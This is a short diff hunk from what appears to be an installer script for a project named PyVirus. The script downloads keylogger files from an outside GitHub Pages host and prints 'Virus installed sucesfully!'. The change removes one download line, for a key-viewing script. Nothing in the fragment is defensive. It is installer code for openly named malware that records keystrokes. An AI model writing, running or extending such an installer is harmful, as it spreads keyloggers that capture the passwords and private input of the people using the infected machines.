@@ -36,7 +36,6 @@ print("downloading files")
 try:
  download_file("https://pyvirus123.github.io/PyVirus/viruses/preset/keylogger/main.py", "viruses/preset/keylogger/main.py")
  download_file("https://pyvirus123.github.io/PyVirus/viruses/preset/keylogger/keys.log", "viruses/preset/keylogger/keys.log")
- download_file("https://pyvirus123.github.io/PyVirus/viruses/preset/keylogger/viewkeys.py", "viruses/preset/keylogger/viewkeys.py")
 except:
  print("Failed to download files.")
 print("Virus installed sucesfully!")
